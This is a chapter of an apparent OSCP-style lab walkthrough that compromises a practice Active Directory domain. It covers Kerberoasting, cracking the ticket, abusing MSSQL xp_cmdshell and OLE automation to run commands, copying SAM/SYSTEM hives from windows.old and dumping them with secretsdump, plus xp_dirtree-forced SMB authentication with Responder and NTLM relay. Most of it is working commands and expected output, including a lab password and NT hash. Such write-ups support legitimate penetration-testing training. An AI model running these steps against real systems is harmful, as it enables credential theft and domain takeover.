# 06 — MS02: kerberoast, MSSQL, and the stale hives

This is the chapter that produces a domain administrator **from the directory itself**, with no
credential reuse and no prior knowledge. It is the intended route to DC01.

## 6.1 Why MS02 and not the DC

`SQL_SVC` is a domain account whose SPN is `MSSQL/MS02.oscp.exam`. Kerberoasting it yields a
TGS encrypted with that account's NT hash — crackable offline — and that account is the SQL
Server service principal on MS02. So one roast gives an authenticated, *privileged* database
login on a member server, which is a much softer target than the DC.

The chain, in one line:

```
kerberoast SQL_SVC  →  MSSQL as sysadmin  →  xp_cmdshell  →  windows.old hives  →  tom_admin
```

## 6.2 Kerberoast

Any authenticated domain user can request a TGS for any account with an SPN. `eric.wallows` is
sufficient — no local admin on any host is required for this step.

```bash
# clock first, or Kerberos dies with KRB_AP_ERR_SKEW
sudo rdate -n 10.10.133.152

impacket-GetUserSPNs oscp.exam/eric.wallows:EricLikesRunning800 \
  -dc-ip 10.10.133.152 -request -outputfile eric_kerb.txt
```

**Expected**:

```
ServicePrincipalName        Name       MemberOf  PasswordLastSet             LastLogon
--------------------------  ---------  --------  --------------------------  --------------------------
MSSQL/MS02.oscp.exam        SQL_SVC              2022-12-05 10:30:05.123456  2022-11-10 11:15:51.123456
HTTP/MS01.oscp.exam         WEB_SVC              2022-11-11 07:11:19.123456  <never>

$krb5tgs$23$*SQL_SVC$OSCP.EXAM$oscp.exam/SQL_SVC*$...
$krb5tgs$23$*WEB_SVC$OSCP.EXAM$oscp.exam/WEB_SVC*$...
```

Two diagnostic notes, both learned the hard way:

- **`Total of records returned N` is `logging.debug`** — it only appears with `-debug`. Silence
  is not automatically failure; an empty output file with no table is a different problem
  (LDAP bind) than a table with an empty file (the TGT/TGS stage, usually clock or `88/tcp`).
- `-dc-ip` is not optional here. MS01 is a member server with no `88/tcp`; without an explicit
  KDC address the tool tries to discover one and fails.

Crack the TGS — RC4 (`-m 13100`) is fast, seconds to minutes:

```bash
hashcat -m 13100 eric_kerb.txt /usr/share/wordlists/rockyou.txt --potfile-path ./pot --force
hashcat -m 13100 eric_kerb.txt --potfile-path ./pot --show
```

**Expected**:

```
$krb5tgs$23$*SQL_SVC$OSCP.EXAM$oscp.exam/SQL_SVC*$...:<password>
```

If `SQL_SVC` resists rockyou, escalate the attack rather than giving up — rules, then the
targeted generator from 4.6. A 2022-vintage service account on a build this sloppy rarely
survives a dictionary.

## 6.3 Confirm the account before using it

```bash
nxc smb 10.10.133.154 -u SQL_SVC -p '<cracked>' -d oscp.exam
nxc winrm 10.10.133.154 -u SQL_SVC -p '<cracked>' -d oscp.exam
```

WinRM will likely return `[-]` — that is fine and expected: `SQL_SVC` is in no AD groups, so it
is not in `Remote Management Users`. SMB returning `[+]` confirms the password. The account's
value is MSSQL, not WinRM.

## 6.4 MSSQL: prove `sysadmin` first

MS02 runs **two** instances. Test both — a second instance often has different logins.

```bash
# default instance
impacket-mssqlclient oscp.exam/SQL_SVC:'<cracked>'@10.10.133.154 -windows-auth -port 1433

# SQLEXPRESS
impacket-mssqlclient oscp.exam/SQL_SVC:'<cracked>'@10.10.133.154 -windows-auth -port 49700
```

The first thing to run in every MSSQL session is not `whoami` — it is this:

```sql
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
```

`sysadmin = 1` means the instance is yours. The contrast with `web_svc` on the same server is
the whole point of this chapter:

| Login | `SYSTEM_USER` | `IS_SRVROLEMEMBER('sysadmin')` |
|---|---|---|
| `web_svc` | **`guest`** | **0** |
| `SQL_SVC` | `OSCP\SQL_SVC` | **1** |

`web_svc` lands as `guest` because no `CREATE LOGIN [OSCP\web_svc]` exists — it is only a
member of the public group and inherits `guest` in `master`. That is why
`sp_configure ... RECONFIGURE` fails with *"User does not have permission to perform this
action"* on the earlier attempt. Do not mistake that error for a wrong password: the credential
authenticated perfectly, it simply was not mapped.

## 6.5 `xp_cmdshell`: SYSTEM-adjacent execution

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;          RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**Expected**:

```
output
--------------------------------------------------------------------------------
nt service\mssql$sqlexpress
```

The shell runs as the **SQL Server service account**. If that is a domain account — which it is
here, `SQL_SVC` — you are executing as a domain identity, not as a local service. Either way the
hive copy below works, because the service account owns the database files and has write access
to `C:\Windows\Temp` by inheritance.

If `xp_cmdshell` is policy-blocked, the alternatives in order:

```sql
-- 1. sp_OACreate (OLE automation) — same privilege level, different gate
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT;
EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c whoami > C:\Windows\Temp\o.txt';

-- 2. write a file and use a SQL Agent job
-- 3. if sysadmin is false but IMPERSONATE is granted:
EXECUTE AS LOGIN = 'sa';
```

## 6.6 The artefact: `windows.old`

This is the step that is easy to get wrong, and the reason the chapter exists.

> **`tom_admin` is not in MS02's live SAM.** It is in the *previous* Windows installation,
> retained at `C:\windows.old` by the rebuild. Dump the live SAM and you will find
> `Administrator` and `support` and conclude the chain is broken.

```sql
EXEC xp_cmdshell 'dir C:\windows.old\Windows\System32\config\';

EXEC xp_cmdshell 'copy /y C:\windows.old\Windows\System32\config\SAM    C:\Windows\Temp\SAM_old';
EXEC xp_cmdshell 'copy /y C:\windows.old\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM_old';
```

The registry keeps those hives open, so a plain copy can fail with a sharing violation. Two
fallbacks, in order:

```sql
-- a. copy via the shadow copy of the volume
EXEC xp_cmdshell 'vssadmin list shadows';
EXEC xp_cmdshell 'copy /y \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\SAM_old';

-- b. copy the whole config directory as a tree, which bypasses the open handle
EXEC xp_cmdshell 'robocopy C:\windows.old\Windows\System32\config C:\Windows\Temp\config_old /b SAM SYSTEM';
```

Then pull both files back:

```bash
nxc smb 10.10.133.154 -u SQL_SVC -p '<cracked>' -d oscp.exam \
  --get-file '\Windows\Temp\SAM_old' ./SAM_old
nxc smb 10.10.133.154 -u SQL_SVC -p '<cracked>' -d oscp.exam \
  --get-file '\Windows\Temp\SYSTEM_old' ./SYSTEM_old
```

Again: **share-relative paths**. A `C:\` prefix returns `STATUS_OBJECT_NAME_INVALID`.

## 6.7 Parse the hives offline

```bash
impacket-secretsdump -sam SAM_old -system SYSTEM_old LOCAL
```

**Expected** — the previous build's local accounts, including the one that matters:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<hash>:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
```

`tom_admin` appears **only** in this output. That is the artefact: a local account from before
the rebuild, whose password was reused onto the domain controller.

## 6.8 Alternative route when `SQL_SVC` will not crack

If the TGS resists cracking, MS02 still has one surface open to `web_svc`: the `guest` session
on `49700` retains `EXECUTE` on `xp_dirtree`, which authenticates **outbound** over SMB as the
SQL service account.

```sql
EXEC master..xp_dirtree '\\10.10.133.153\share';
```

Catch it with a listener on the MS01-side address, then crack the NetNTLMv2:

```bash
# ligolo console - forward 445 from the agent to Kali
ligolo-ng » listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp

sudo responder -I ligolo -v
hashcat -m 5600 sqlsvc_netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

**Caveat that will bite you**: MS01's own SMB already owns 445 on the agent, so
`listener_add` will not bind cleanly. Either stop `lanmanserver` on MS01 for the duration
(`net stop lanmanserver`, restart after), or run the listener from a host with a free 445.

If the captured principal ends in `$` it is the machine account `MS02$` — uncrackable, and the
move becomes an SMB relay rather than a crack. MS02 reports `signing enabled but not required`,
so relay is viable; `ntlmrelayx` against a target where that account is local admin.

## 6.9 What this chapter proves

| Claim | Evidence |
|---|---|
| `SQL_SVC` is a domain service principal | SPN `MSSQL/MS02.oscp.exam`, `hasspn = true` in LDAP |
| It has database admin rights | `IS_SRVROLEMEMBER('sysadmin') = 1` |
| Code execution on MS02 | `xp_cmdshell 'whoami'` → `nt service\mssql$sqlexpress` |
| A prior installation is retained | `dir C:\windows.old\Windows\System32\config\` lists `SAM`, `SYSTEM` |
| `tom_admin` exists in the old build | `secretsdump -sam -system LOCAL` prints the RID |
| Its password is reused realm-wide | PTH to DC01 succeeds (chapter 07) |

## 6.10 What MS02 is *not*

Worth stating, because it manages expectations: MS02 issues no flag. Nothing under `C:\Users`
carries `local.txt` or `proof.txt`. MS02's value is entirely the hives it retained —
one stale file, one reused password, and the domain falls.
